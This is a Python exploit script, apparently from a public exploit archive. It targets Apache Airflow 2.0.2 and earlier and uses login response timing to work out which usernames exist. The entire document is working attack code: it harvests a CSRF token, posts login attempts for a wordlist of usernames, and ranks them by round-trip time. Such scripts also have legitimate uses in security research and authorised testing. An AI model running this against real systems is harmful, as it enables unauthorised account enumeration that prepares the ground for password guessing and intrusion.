# Exploit Title: Apache Airflow <= 2.0.2 - Time-Based Account Enumeration
# Author: Dolev Farhi
# Date: 2021-05-13
# Vendor Homepage: http://airflow.apache.org/
# Version: 2.0.2
# Tested on: Ubuntu


import sys
import requests
import time

scheme = 'http'
host = '192.168.0.1'
port = 8080

# change with your wordlist
usernames = ['airflow', 'guest', 'admin', 'administrator', 'idontexist', 'test']

url = '{}://{}:{}'.format(scheme, host, port)
login_endpoint = '/login/?next={}/home'.format(url)

session = requests.Session()

def get_csrf():
  token = None
  r = session.get(url + login_endpoint)

  for line in r.text.splitlines():
    if 'csrf_token' in line:
      try:
        token = line.strip().split('"')[-2]
      except:
        pass
  return token

csrf_token = get_csrf()

if not csrf_token:
  print('Could not obtain CSRF token, the exploit will likely fail.')
  sys.exit(1)

data = {
  'csrf_token':csrf_token,
  'username':'',
  'password':'abc'
}

attempts = {}
found = False

for user in usernames:
  start = time.time()
  data['username'] = user
  r = session.post(url + login_endpoint, data=data)
  roundtrip = time.time() - start
  attempts["%.4f" % roundtrip] = user

print('[!] Accounts existence probability is sorted from high to low')

count = 0

for key in sorted(attempts, reverse=True):
  count += 1
  print("%s. %s (timing: %s)" % (count, attempts[key], key))